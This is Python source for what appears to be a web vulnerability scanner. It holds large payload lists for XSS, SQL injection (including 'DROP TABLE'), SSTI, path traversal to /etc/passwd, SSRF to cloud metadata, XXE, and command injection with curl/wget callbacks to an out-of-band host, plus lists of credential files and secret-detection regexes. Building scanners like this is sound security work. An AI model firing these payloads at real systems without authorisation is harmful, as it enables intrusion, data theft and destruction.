"""
VulnScanner — proof-based vulnerability detection engine.
Modules: XSS, SQLi, SSTI, LFI, SSRF, Open Redirect, Security Headers, GraphQL, IDOR.
"""

import json
import os
import threading
import time
import re
import hashlib
import random
from datetime import datetime, timezone
from typing import Any, Dict, Optional, List
from urllib.parse import urlparse, urlencode, parse_qs, urljoin, urlunparse
from queue import Queue
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup
import yaml

from modules.utils import (
    make_session, safe_get, safe_post, finding, finding_v2, log, Colors, url_in_scope,
    BaselineFingerprinter, VulnerabilityFinding, DeduplicationEngine,
    OOBDetectionFramework, BrowserValidator, VerificationStage,
    EvidenceStrength, ConfidenceLevel, calculate_confidence,
    evidence_strength_from_score, false_positive_risk_from_score,
    prioritize_findings, compute_priority_score,
    TechnologyFingerprinter, reset_seen_findings, _build_curl,
)
from engines import ValidationEngine, EvidenceEngine

# ── Payloads ──────────────────────────────────────────────────────────────────

XSS_PAYLOADS = [
    '<svg/onload=alert(1)>',
    '"><img src=x onerror=alert(1)>',
    "';alert(1)//",
    '{{7*7}}',
    '${7*7}',
    '<script>alert(1)</script>',
    '"><script>alert(1)</script>',
    "javascript:alert(1)",
    # mXSS — parser mutation
    '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
    '<select><option><style></style><img src=x onerror=alert(1)></select>',
]

# Framework-specific XSS payloads for React, Angular, Vue, jQuery
FRAMEWORK_XSS_PAYLOADS = {
    "react": [
        {"payload": '{{__proto__.toString.constructor("alert(1)")()}}', "sink": "dangerouslySetInnerHTML"},
        {"payload": "<img src=x onerror=alert(1)>", "sink": "dangerouslySetInnerHTML"},
    ],
    "angular": [
        {"payload": "{{constructor.constructor('alert(1)')()}}", "sink": "template"},
        {"payload": "{$on.constructor('alert(1)')()}", "sink": "template"},
        {"payload": "{{a='constructor';b='alert(1)';this[a][a](b)()}}", "sink": "template"},
        {"payload": "[innerHTML]='<img src=x onerror=alert(1)>'", "sink": "property_binding"},
    ],
    "vue": [
        {"payload": "{{constructor.constructor('alert(1)')()}}", "sink": "v-html"},
        {"payload": "{{{constructor.constructor('alert(1)')()}}}", "sink": "template"},
        {"payload": '<div v-html="\'<img src=x onerror=alert(1)>\'">', "sink": "v-html"},
    ],
    "jquery": [
        {"payload": '<img src=x onerror=alert(1)>', "sink": "$.html()"},
        {"payload": "<script>alert(1)</script>", "sink": "$.append()"},
        {"payload": "<img src=x onerror=alert(1)>", "sink": "$()"},
    ],
    "generic": [
        {"payload": "';-alert(1)-'", "sink": "eval"},
        {"payload": "\\';alert(1)//", "sink": "js_string"},
        {"payload": "</script><script>alert(1)</script>", "sink": "script_breakout"},
    ],
}

# WAF bypass payloads — encoding variants, case mutations, comment injection
WAF_BYPASS_XSS = [
    '<svg/onload=alert&#40;1&#41;>',
    '<svg/onload=alert(1)>',
    '%3Csvg/onload=alert(1)%3E',
    '%253Csvg/onload=alert(1)%253E',
    '<SvG/OnLoAd=alert(1)>',
    '<svg/onload=alert(1)<!--',
    '--><svg/onload=alert(1)>',
    '"><svg/onload=alert(1)>',
    '"><svg/onload=alert(1)<!--',
    "onload=alert(1)//<svg ' \"",
    'javascript:alert(1)',
    'java%00script:alert(1)',
    'java%09script:alert(1)',
    'JaVaScRiPt:alert(1)',
    '&#106;avascript:alert(1)',
    '&#x6A;avascript:alert(1)',
]

# Probe payloads for DOM sink detection
DOM_XSS_PROBES = [
    "bbh_dom_probe",
    "<img src=x onerror=alert(1)>",
    "';alert(1)//",
]

DEFAULT_XSS_PAYLOADS: dict = {
    "reflected": XSS_PAYLOADS,
    "polyglot": [
        '"><svg/onload=alert(1)>',
        "';alert(1)//",
        '${alert(1)}',
        ' " onfocus=alert(1) autofocus= ',
        'expression(alert(1))',
    ],
    "dom": [
        '<img src=x onerror=window.__bbh_xss=1>',
        '"><img src=x onerror=window.__bbh_xss=1>',
        "javascript:window.__bbh_xss=1",
    ],
    "framework": FRAMEWORK_XSS_PAYLOADS,
    "waf_bypass": WAF_BYPASS_XSS,
    "dom_probes": DOM_XSS_PROBES,
}

CONTEXT_XSS_PAYLOADS = {
    "html": [
        '<img src=x onerror=alert(1)>',
        '<svg/onload=alert(1)>',
        '<script>alert(1)</script>',
    ],
    "attribute": [
        '" onfocus=alert(1) autofocus= ',
        '" autofocus onfocus=alert(1) x="',
        '" onmouseover=alert(1) x="',
    ],
    "javascript": [
        "';alert(1)//",
        "</script><script>alert(1)</script>",
        "\\';alert(1)//",
    ],
    "url": [
        "javascript:alert(1)",
        "javaScript:alert(1)",
    ],
    "dom": [
        '<img src=x onerror=window.__bbh_xss=1>',
        "\"-window.__bbh_xss=1-\"",
    ],
}

SQLI_ERRORS = [
    "sql syntax", "mysql_fetch", "ora-", "pls-", "ora-01756",
    "db2 sql error", "sqlite_error", "unclosed quotation mark",
    "quoted string not properly terminated", "syntax error",
    "pg_query", "sqlite3", "microsoft sql server", "jdbc",
    "sqlstate", "sql server", "pdo", "you have an error in your sql",
    "unexpected end of SQL command", "division by zero",
    "column count doesn't match", "unknown column",
]

DEFAULT_SQLI_PAYLOADS = {
    "error_based": [
        "'", '"', "' OR '1'='1", "' OR 1=1--", '" OR 1=1--',
        "1; DROP TABLE users--", "' UNION SELECT NULL--",
        # WAF bypass variants
        "' OR 1=1-- -", "' OR 1=1#", "' OR '1'='1' --",
        "'/**/OR/**/1=1--", "'/*!00000OR*/1=1--",
    ],
    "time_based": [
        "' AND SLEEP(5)-- -", '" AND SLEEP(5)-- -',
        "'; WAITFOR DELAY '0:0:5'--", "1; WAITFOR DELAY '0:0:5'--",
        # PostgreSQL, Oracle
        "' AND (SELECT pg_sleep(5))--", "' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)--",
    ],
    "boolean_based": [
        [" AND 1=1-- -", " AND 1=2-- -"],
        ["' AND '1'='1", "' AND '1'='2"],
        ["' AND 1=1--", "' AND 1=2--"],
    ],
    "union": [
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
        # ORDER BY column counting
        "' ORDER BY 1--",
        "' ORDER BY 2--",
        "' ORDER BY 3--",
        "' ORDER BY 4--",
        "' ORDER BY 5--",
        "' ORDER BY 6--",
        "' ORDER BY 7--",
        "' ORDER BY 8--",
        "' ORDER BY 9--",
        "' ORDER BY 10--",
    ],
    "oob": [
        "'; exec xp_dirtree '//{oob}/test'--",
        "' UNION SELECT LOAD_FILE(CONCAT('\\\\', '{oob}', '\\\\test'))",
        "' OR 1=1 INTO OUTFILE '\\\\{oob}\\test'--",
        # DNS-based OOB
        "' AND (SELECT utl_inaddr.get_host_address('{oob}') FROM dual)--",
        "' AND (SELECT pg_read_file('\\\\{oob}\\test'))--",
    ],
}

# POST body SQLi payloads — JSON, XML, form-encoded
POST_SQLI_PAYLOADS = {
    "json": [
        '{"id": "1\' OR 1=1--"}',
        '{"id": "1\' AND SLEEP(5)--"}',
        '{"query": "1\' UNION SELECT NULL--"}',
    ],
    "xml": [
        '<?xml version="1.0"?><id>1\' OR 1=1--</id>',
        '<?xml version="1.0"?><query>1\' UNION SELECT NULL--</query>',
    ],
    "form": [
        "id=1' OR 1=1--",
        "id=1' AND SLEEP(5)--",
        "query=1' UNION SELECT NULL--",
    ],
}

SSTI_PAYLOADS = {
    "arithmetic": [
        "{{7*7}}", "{{7+7}}", "{{7-7}}",
        "${7*7}", "${7+7}",
        "<%=7*7%>", "<%=7+7%>",
        "#{7*7}", "#{7+7}",
    ],
    "engine_fingerprint": [
        ("twig", "{{7*'7'}}", "49"),
        ("jinja2", "{{7*'7'}}", "7777777"),
        ("freemarker", "${7*7}", "49"),
        ("velocity", "#set($x=7*7)$x", "49"),
        ("razor", "@(7*7)", "49"),
        ("smarty", "{$smarty.now}", ""),
        ("mustache", "{{7*7}}", "49"),
    ],
    "read_proof": [
        "{{config}}", "{{self._TemplateReference__context}}",
        "${7*7}", "#{7*7}",
    ],
}

SSTI_ENGINE_PATTERNS = {
    "jinja2": [
        re.compile(r"\{\{7\*'7'\}\}.*?7777777"),
        re.compile(r"\{\{config\}\}"),
        re.compile(r"cycler|joiner|namespace|lipsum|dict|url_for|get_flashed_messages"),
    ],
    "twig": [
        re.compile(r"\{\{7\*'7'\}\}.*?49"),
        re.compile(r"\{\{7\*7\}\}"),
        re.compile(r"self\._TemplateReference__context"),
    ],
    "freemarker": [
        re.compile(r"\$\{7\*7\}"),
    ],
    "smarty": [
        re.compile(r"\{\$smarty"),
    ],
}

LFI_PAYLOADS = [
    "../../../../etc/passwd", "../../../../etc/shadow",
    "../../../../windows/win.ini",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252F..%252F..%252Fetc%252Fpasswd",
    "/etc/passwd", "C:\\Windows\\win.ini",
]

LFI_SIGNATURES = [
    "root:x:0:0", "[extensions]", "[boot loader]",
    "for 16-bit app support", "daemon:x:",
]

SSRF_PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://169.254.169.254/metadata/instance",
    "http://100.100.100.200/latest/meta-data/",
    "http://localhost:8080", "http://localhost:8443",
]

SSRF_PARAM_NAMES = [
    "url", "uri", "path", "dest", "destination", "redirect",
    "next", "data", "reference", "site", "html", "val", "validate",
    "domain", "callback", "return", "page", "feed", "host",
    "port", "to", "out", "view", "dir", "show", "navigation", "open",
]

SSRF_SIGNATURES = [
    "ami-id", "instance-id", "computeMetadata",
    "iam/security-credentials", "metadata",
]

XXE_PAYLOADS = {
    "in_band": [
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><root>&xxe;</root>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">]><root>&xxe;</root>',
    ],
    "error_based": [
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "file:///nonexist">%xxe;]><root>test</root>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><root>&xxe;</root>',
    ],
    "oob": [
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://{oob}/xxe">%xxe;]><root>test</root>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "ftp://{oob}/xxe">%xxe;]><root>test</root>',
    ],
    "blind": [
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "http://{oob}/xxe.dtd">%dtd;]><root>&send;</root>',
    ],
}

XXE_SIGNATURES = [
    "root:x:0:0", "[extensions]", "[fonts]", "[boot loader]",
    "for 16-bit app support", "daemon:x:", "bin:x:",
    "www-data:x:", "ROOT", "Administrator",
]

CMD_INJECTION_PAYLOADS = {
    "unix": [
        ("; id", "uid="),
        ("| id", "uid="),
        ("`id`", "uid="),
        ("$(id)", "uid="),
        ("; uname -a", "Linux"),
        ("| uname -a", "Linux"),
        ("; whoami", ""),
        ("| whoami", ""),
        ("; ping -c 1 127.0.0.1", ""),
        ("| ping -c 1 127.0.0.1", ""),
        ("; sleep 5", ""),
        ("| sleep 5", ""),
        ("`sleep 5`", ""),
    ],
    "windows": [
        ("| ver", "Microsoft"),
        ("& ver", "Microsoft"),
        ("; systeminfo", "OS"),
        ("| systeminfo", "OS"),
        ("& ping -n 5 127.0.0.1", ""),
        ("| ping -n 5 127.0.0.1", ""),
        ("& timeout 5", ""),
        ("| timeout 5", ""),
    ],
    "time_based": [
        ("; sleep 5", 5),
        ("| sleep 5", 5),
        ("& sleep 5", 5),
        ("`sleep 5`", 5),
        ("$(sleep 5)", 5),
        ("| ping -c 5 127.0.0.1", 5),
        ("& ping -n 5 127.0.0.1", 5),
    ],
    "oob": [
        "| nslookup {oob}",
        "; nslookup {oob}",
        "`nslookup {oob}`",
        "| curl http://{oob}/cmd",
        "; curl http://{oob}/cmd",
        "| wget http://{oob}/cmd",
        "; wget http://{oob}/cmd",
    ],
}

CMD_INJECTION_OUTPUT_SIGNATURES = [
    "uid=", "gid=", "groups=", "load average",
]
CMD_INJECTION_OUTPUT_SIGNATURES_WIN = [
    "boot loader", "for 16-bit app support",
]

SENSITIVE_PATTERNS = [
    ("AWS Access Key", re.compile(r"AKIA[0-9A-Z]{16}")),
    ("AWS Secret Key", re.compile(r"(?i)aws_secret_access_key\s*[:=]\s*[A-Za-z0-9/+=]{40}")),
    ("GitHub Token", re.compile(r"(?:ghp_|github_pat_|gho_|ghu_|ghs_|ghr_)[A-Za-z0-9_]{36,}")),
    ("Slack Token", re.compile(r"(?:xox[baprs]-|xapp-)[0-9A-Za-z-]{10,}")),
    ("Private RSA Key", re.compile(r"-----BEGIN RSA PRIVATE KEY-----")),
    ("Private EC Key", re.compile(r"-----BEGIN EC PRIVATE KEY-----")),
    ("JWT Token", re.compile(r"eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+")),
]

OPEN_REDIRECT_PAYLOADS = [
    "https://evil.com", "//evil.com",
    "https://evil.com%2F%2F", "/\\evil.com",
]

REDIRECT_PARAMS = [
    "redirect", "redirect_to", "redirect_url", "return", "return_to",
    "returnUrl", "next", "url", "goto", "dest", "destination",
    "continue", "forward", "target", "redir", "r", "u",
]

CSRF_TOKEN_NAMES = {
    "csrf_token", "csrfmiddlewaretoken", "authenticity_token",
    "token", "csrf", "xsrf-token", "xsrf_token",
    "anti_csrf_token", "_csrf", "_token",
}

COMMON_DIRFUZZ_PATHS = [
    "admin/", "login/", "dashboard/", "config/", "backup/", "uploads/",
    "portal/", "server-status", "shell/", "wp-admin/", "wp-login.php",
    "phpmyadmin/", "vendor/", ".git/", ".env", ".gitignore",
]

EXPOSED_FILES = [
    ".env", ".env.local", ".env.backup", "/.git/config", "/.gitignore",
    "/backup.zip", "/backup.tar.gz", "/backup.sql", "/phpinfo.php",
    "/wp-config.php", "/wp-config.php.bak", "/.DS_Store", "/web.config",
    "/web.config.bak", "/config.php", "/config.xml", "/.htaccess",
    "/.htpasswd", "/web.xml", "/pom.xml", "/.aws/credentials",
    "/.ssh/id_rsa", "/Dockerfile", "/.dockerignore", "/docker-compose.yml",
    "/secrets.txt", "/passwords.txt", "/.env.example",
]

SECURITY_HEADERS = {
    "Strict-Transport-Security": "high",
    "Content-Security-Policy": "high",
    "X-Frame-Options": "medium",
    "X-Content-Type-Options": "medium",
    "Referrer-Policy": "low",
    "Permissions-Policy": "low",
    "X-XSS-Protection": "low",
}

TAKEOVER_SIGNATURES = [
    "NoSuchBucket", "There isn't a GitHub Pages site here.",
    "Fastly error: unknown domain", "No such app",
    "The requested URL was not found on this server.",
    "A DNS leak or misconfiguration", "NoSuchDomain", "No such host",
]

CLICKJACKING_SAFE_DIRECTIVES = [
    "frame-ancestors 'none'", "frame-ancestors 'self'", "frame-ancestors https:",
]

# ── Scanner class ─────────────────────────────────────────────────────────────

class VulnScanner:
    def __init__(self, config: dict, recon_data: dict, container=None):
        self.config    = config
        self.recon     = recon_data
        self.container = container
        self.timeout   = config.get("timeout", 10)
        self.threads   = config.get("threads", 10)
        self.verbose   = config.get("verbose", False)
        self.session   = make_session(config)
        self.base_url  = config.get("target", "").rstrip("/")
        self.findings  : list[dict] = []
        self._lock     = threading.Lock()
        self.dedup     = DeduplicationEngine()

        if container:
            self.validation = container.validation_engine
            self.evidence   = container.evidence_engine
            self.oob        = (container.oob_framework
                               if container.oob_framework
                               else OOBDetectionFramework(config))
            self.browser    = (container.browser_validator
                               if container.browser_validator
                               else BrowserValidator(config))
        else:
            self.oob       = OOBDetectionFramework(config)
            self.browser   = BrowserValidator(config)
            self.validation = ValidationEngine(config)
            self.evidence   = EvidenceEngine()

        # Phase 3: new scanner delegates (scanners/ package)
        self._use_new_scanners = config.get("use_new_scanners", False)
        self._xss_scanner   = None
        self._headers_scanner = None

        self.waf_detected = False
        self.baselines    = BaselineFingerprinter(self.session, self.timeout)
        self.tech_fingerprinter = TechnologyFingerprinter(self.session, self.timeout)
        self._prepared    = False
        self._second_order_store: dict[str, list[dict]] = {}

    # ── Dedup Wrapper ────────────────────────────────────────────────────

    def _add(self, f: Optional[dict]) -> bool:
        if not f:
            return False
        with self._lock:
            if not self.dedup.add_legacy(f):
                return False
            sev = f.get("severity", "info").upper()
            title = f.get("title", "Finding")[:60]
            url = f.get("url", "")[:60]
            log(f"  [FOUND] [{sev}] {title} @ {url}", Colors.RED if sev in ("CRITICAL", "HIGH") else Colors.YELLOW)
            return True

    def _get_findings(self) -> list[dict]:
        raw = self.dedup.get_findings()
        return prioritize_findings(raw)

    # ── Re-verification Loop ──────────────────────────────────────────

    def _run_reverification_loop(self) -> None:
        """Re-attempt STAGE 1 (detected, 1 signal) findings with alternative signal types."""
        all_findings = self.dedup.get_findings()
        attempt_count: dict[str, int] = {}
        for f in all_findings:
            fp = f.get("fingerprint", "")
            stage = f.get("verification_stage", "").lower()
            if stage not in ("detected",):
                continue
            vuln_type = f.get("type", "").lower()
            url = f.get("url", "")
            param = f.get("parameter", "")
            signal_count = len(f.get("validation_steps", []))
            if signal_count >= 2:
                continue

            # Track attempts; discard after 3
            attempt_count[fp] = attempt_count.get(fp, 0) + 1
            if attempt_count[fp] > 3:
                log(f"  [Re-verify] Discarding {vuln_type} at {url} after 3 failed re-verifications", Colors.YELLOW, verbose_only=True, verbose=self.verbose)
                continue

            if "sqli" in vuln_type.lower():
                # Try time-based if error-based was used
                payloads = self._load_payloads("sqli")
                original_val = f.get("original_value", "1")
                signals, _ = self._sqli_test_parameter(url, param or "id", original_val, payloads, self.config.get("oob_host"))
                if signals.get("time") or signals.get("union") or signals.get("oob"):
                    f["verification_stage"] = VerificationStage.VALIDATED.value
                    log(f"  [Re-verify] SQLi at {url} promoted to VALIDATED via alternative signal", Colors.GREEN, verbose_only=True, verbose=self.verbose)

            elif "xss" in vuln_type.lower():
                # Retry with simpler payload
                simple_payloads = ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"]
                for sp in simple_payloads:
                    test_url = self._inject_param(url, param or "q", sp)
                    exec_result = self.browser.check_xss_execution(test_url, sp)
                    if exec_result and (exec_result.get("alert_fired") or exec_result.get("dom_mutation")):
                        f["verification_stage"] = VerificationStage.VERIFIED.value
                        log(f"  [Re-verify] XSS at {url} promoted to EXPLOITABLE via Playwright re-check", Colors.GREEN, verbose_only=True, verbose=self.verbose)
                        break

    # ── Chain Analysis ────────────────────────────────────────────────

    @staticmethod
    def _origin(url: str) -> str:
        """Extract scheme + netloc from a URL for origin comparison."""
        try:
            p = urlparse(url)
            return f"{p.scheme}://{p.netloc}".lower()
        except Exception:
            return ""

    @staticmethod
    def _is_exploitable(f: dict) -> bool:
        """Chain-quality check: Stage 3+ (exploitable/verified)."""
        stage = f.get("verification_stage", "").lower()
        return stage in ("exploitable", "verified")

    @staticmethod
    def chain_analysis(findings: list[dict]) -> list[dict]:
        """Detect exploitable chains and enrich impact fields.

        Only pairs findings that are both Stage 3+ (exploitable/verified)
        and share the same origin (scheme + host).
        """
        chains_found: list[dict] = []
        exploitable = [f for f in findings if VulnScanner._is_exploitable(f)]

        # CSRF + XSS (same origin) → ATO
        csrf = [f for f in exploitable if "csrf" in f.get("type", "").lower() and f.get("url")]
        xss = [f for f in exploitable if "xss" in f.get("type", "").lower() and f.get("url")]
        for c in csrf:
            c_origin = VulnScanner._origin(c["url"])
            match = next((x for x in xss if VulnScanner._origin(x["url"]) == c_origin), None)
            if match:
                cf = finding(
                    vuln_type="Chained: CSRF + XSS → Account Takeover",
                    url=c["url"] + " & " + match["url"],
                    severity="critical",
                    details="CSRF vulnerabilities allow an attacker to forge requests; combined with stored XSS, this enables silent account takeover without user interaction beyond visiting a page.",
                    evidence=f"Same-origin CSRF ({c['url']}) + XSS ({match['url']})",
                    request=f"Chain of:\n  CSRF: {_build_curl('GET', c['url'], {})}\n  XSS: {_build_curl('GET', match['url'], {})}",
                    response_excerpt=f"See individual findings at {c['url']} and {match['url']} for full response context.",
                    verification_stage=VerificationStage.VALIDATED.value,
                    steps_to_reproduce=[
                        f"1. Trigger XSS at {match['url']} to inject CSRF payload",
                        f"2. Victim visits page; CSRF fires to {c['url']}",
                        "3. Account state changed without victim interaction",
                    ],
                )
                if cf:
                    cf["chains"] = True
                    cf["impact"] = "Full account takeover via CSRF-triggered stored XSS payload injection."
                    chains_found.append(cf)
                break

        # SSRF (exploitable only) → RCE potential
        ssrf = [f for f in exploitable if "ssrf" in f.get("type", "").lower()]
        if ssrf:
            cf = finding(
                vuln_type="Chained: SSRF → Internal Service Enumeration / RCE",
                url=ssrf[0].get("url", ""),
                severity="critical",
                details="SSRF can be leveraged to probe internal services, access cloud metadata endpoints, or exploit internal-facing RCE (e.g., Jenkins, Hadoop, Consul).",
                evidence=f"Exploitable SSRF: {len(ssrf)} finding(s)",
                request=_build_curl("GET", ssrf[0].get("url", ""), {}),
                response_excerpt=f"SSRF at {ssrf[0].get('url', '')} can reach internal services; full response in individual finding.",
                verification_stage=VerificationStage.EXPLOITABLE.value,
                steps_to_reproduce=[
                    f"1. Send crafted request to {ssrf[0].get('url', '')} with SSRF payload",
                    "2. Observe callback on OOB listener or probe internal services",
                    "3. Use access to internal network for lateral movement or RCE",
                ],
            )
            if cf:
                cf["chains"] = True
                cf["impact"] = "Potential lateral movement and remote code execution on internal infrastructure."
                chains_found.append(cf)

        # IDOR + sensitive data (same origin) → PII breach
        idor = [f for f in exploitable if "idor" in f.get("type", "").lower() or "id" in f.get("parameter", "").lower()]
        sensitive = [f for f in exploitable if "sensitive" in f.get("type", "").lower()]
        for i in idor:
            i_origin = VulnScanner._origin(i["url"])
            match = next((s for s in sensitive if VulnScanner._origin(s["url"]) == i_origin), None)
            if match:
                cf = finding(
                    vuln_type="Chained: IDOR + Sensitive Data Exposure → PII Breach",
                    url=i["url"] + " & " + match["url"],
                    severity="critical",
                    details="IDOR vulnerabilities allow enumerating user/object identifiers; combined with sensitive data exposure, this enables mass PII harvesting.",
                    evidence=f"Same-origin IDOR ({i['url']}) + Sensitive Data ({match['url']})",
                    request=f"Chain of:\n  IDOR: {_build_curl('GET', i['url'], {})}\n  Sensitive: {_build_curl('GET', match['url'], {})}",
                    response_excerpt=f"See individual findings at {i['url']} and {match['url']} for full response context.",
                    verification_stage=VerificationStage.EXPLOITABLE.value,
                    steps_to_reproduce=[
                        f"1. Enumerate IDs at {i['url']} using sequential/predictable patterns",
                        f"2. Access results at {match['url']} to extract sensitive data",
                        "3. Mass PII harvesting via automated enumeration",
                    ],
                )
                if cf:
                    cf["chains"] = True
                    cf["impact"] = "Massive personal data breach via predictable ID enumeration."
                    chains_found.append(cf)
                break

        existing_titles = {f.get("title", "") for f in findings}
        for cf in chains_found:
            if cf.get("title", "") not in existing_titles:
                findings.append(cf)
                existing_titles.add(cf.get("title", ""))
        return findings

    # ── Self-Halting Conditions ───────────────────────────────────────

    @staticmethod
    def check_self_halt(findings: list[dict]) -> list[dict]:
        """Check for dangerous findings that should halt active testing and flag for human review."""
        halted = []
        for f in findings:
            vuln_type = f.get("type", "").lower()
            severity = f.get("severity", "").lower()
            stage = f.get("verification_stage", "").lower()

            # Dangerous patterns: SQLi OOB confirmed + critical severity
            if "sql" in vuln_type and stage in ("exploitable", "verified") and "oob" in f.get("evidence", "").lower():
                f["title"] = f["title"] + " — Identified: exploitation withheld pending human review"
                f["details"] = f["details"] + " | ⚠ This finding was confirmed via OOB. Further exploitation (data extraction, writes) withheld pending human review per self-halting policy."
                f["impact"] = "CRITICAL: SQL injection confirmed with out-of-band data exfiltration capability. Automated exploitation withheld — requires manual review."
                f["self_halted"] = True
                halted.append(f)

            # Critical SSRF with cloud metadata access
            if "ssrf" in vuln_type and stage in ("exploitable", "verified"):
                f["title"] = f["title"] + " — Identified: exploitation withheld pending human review"
                f["details"] = f["details"] + " | ⚠ SSRF confirmed. Further exploitation (cloud metadata, internal port scanning) withheld pending human review."
                f["impact"] = "CRITICAL: SSRF with out-of-band confirmation. Automated exploitation withheld — requires manual review."
                f["self_halted"] = True
                halted.append(f)

        if halted:
            log(f"  [Self-Halt] {len(halted)} finding(s) flagged for human review — exploitation withheld.", Colors.RED)
        return findings

    # ── Legacy Backward-Compat Helpers (used by ApiScanner, IdorScanner) ──

    def _append_finding(self, findings_list: list, f: Optional[dict]) -> None:
        if f:
            findings_list.append(f)

    def _record_confirmed(self, findings_list: list, vuln_type: str, url: str,
                          severity: str, details: str, evidence: str,
                          method: str, request_data: Any = None,
                          response_excerpt: str = "",
                          steps_to_reproduce: Optional[list] = None,
                          parameter: Optional[str] = None) -> None:
        request_str = ""
        if method and url:
            req_headers = dict(self.session.headers) if hasattr(self, 'session') else {}
            req_cookies = dict(self.session.cookies) if hasattr(self, 'session') else {}
            if request_data is not None:
                import json
                data_str = json.dumps(request_data) if isinstance(request_data, (dict, list)) else str(request_data)
                request_str = _build_curl(method, url, req_headers, data=data_str, cookies=req_cookies)
            else:
                request_str = _build_curl(method, url, req_headers, cookies=req_cookies)
        f = finding(
            vuln_type=vuln_type, url=url, severity=severity,
            details=details, evidence=evidence,
            verification_stage=VerificationStage.VALIDATED.value,
            request=request_str,
            response_excerpt=response_excerpt or "",
            steps_to_reproduce=steps_to_reproduce or [f"Send {method} request to {url}"],
            parameter=parameter or "",
        )
        self._append_finding(findings_list, f)

    def _deduplicate(self, findings_list: list[dict]) -> list[dict]:
        seen = set()
        result = []
        for f in findings_list:
            key = (f.get("vuln_type", ""), f.get("url", ""), f.get("evidence", ""))
            if key not in seen:
                seen.add(key)
                result.append(f)
        return result

    # ── Helpers ──────────────────────────────────────────────────────────

    def _inject_param(self, url: str, param: str, payload: str) -> str:
        try:
            parsed = urlparse(url)
            qs = parse_qs(parsed.query, keep_blank_values=True)
            qs[param] = [payload]
            new_query = urlencode(qs, doseq=True)
            return urlunparse(parsed._replace(query=new_query))
        except Exception:
            return url

    def _urls_with_params(self) -> list[str]:
        return [u for u in self.recon.get("urls", []) if "?" in u]

    def _normalize_list(self, value):
        if value is None:
            return []
        if isinstance(value, str):
            return [item.strip() for item in value.split(",") if item.strip()]
        if isinstance(value, list):
            return value
        return [value]

    def _get_module_param(self, module_name, key, default=None):
        return self.config.get("module_params", {}).get(module_name, {}).get(key, default)

    def _load_payloads(self, payload_type: str) -> Any:
        """Load payloads from YAML file with inline fallback.

        Handles both flat lists and nested dict payloads.  Nested dicts
        (category-based grouping) are flattened into a single ordered list
        by concatenating category values in insertion order.

        For payload types whose fallback is a dict (sqli, xss, xxe, ssti,
        cmdi) the raw dict is returned as-is so that callers can access
        individual categories via .get("category", []).  For list-fallback
        types (lfi, ssrf) the result is always flattened.

        Args:
            payload_type: One of 'sqli', 'xss', 'lfi', 'ssrf', 'xxe', 'ssti', 'cmdi'

        Returns:
            Parsed payload structure (dict or list) from YAML, or the inline
            default constant (DEFAULT_SQLI_PAYLOADS, DEFAULT_XSS_PAYLOADS, etc.)
        """
        yaml_path = os.path.join(
            os.path.dirname(os.path.dirname(__file__)), "payloads", f"{payload_type}.yaml"
        )
        list_types = {"lfi", "ssrf"}
        try:
            with open(yaml_path, "r") as f:
                loaded = yaml.safe_load(f)
            if loaded and "payloads" in loaded:
                raw = loaded["payloads"]
                if isinstance(raw, dict) and payload_type in list_types:
                    flat = []
                    for cat in raw.values():
                        if isinstance(cat, list):
                            flat.extend(cat)
                    if flat:
                        return flat
                if isinstance(raw, (dict, list)):
                    return raw
        except (FileNotFoundError, yaml.YAMLError):
            pass

        fallbacks = {
            "sqli": DEFAULT_SQLI_PAYLOADS,
            "xss": DEFAULT_XSS_PAYLOADS,
            "lfi": LFI_PAYLOADS,
            "ssrf": SSRF_PAYLOADS,
            "xxe": XXE_PAYLOADS,
            "ssti": SSTI_PAYLOADS,
            "cmdi": CMD_INJECTION_PAYLOADS,
        }
        fb = fallbacks.get(payload_type, [])
        if self.verbose:
            log(f"[*] Payload YAML for '{payload_type}' not found or empty — using hardcoded fallback",
                Colors.YELLOW, verbose_only=True, verbose=self.verbose)
        return fb

    def _in_scope(self, url: str) -> bool:
        return url_in_scope(url, self.config)

    def _extract_param_name(self, f: dict) -> str:
        for text in (f.get("details", ""), f.get("evidence", "")):
            if "Parameter '" in text:
                return text.split("Parameter '")[1].split("'")[0]
            if "Form field '" in text:
                return text.split("Form field '")[1].split("'")[0]
        url = f.get("url", "")
        if "?" in url:
            params = parse_qs(urlparse(url).query)
            if params:
                return next(iter(params.keys()))
        return ""

    def _run_threaded(self, fn, items):
        q = Queue()
        results = []
        lock = threading.Lock()
        for item in items:
            q.put(item)

        def worker():
            while not q.empty():
                try:
                    item = q.get_nowait()
                except Exception:
                    return
                try:
                    result = fn(item)
                    if result:
                        with lock:
                            results.extend(result if isinstance(result, list) else [result])
                except Exception as e:
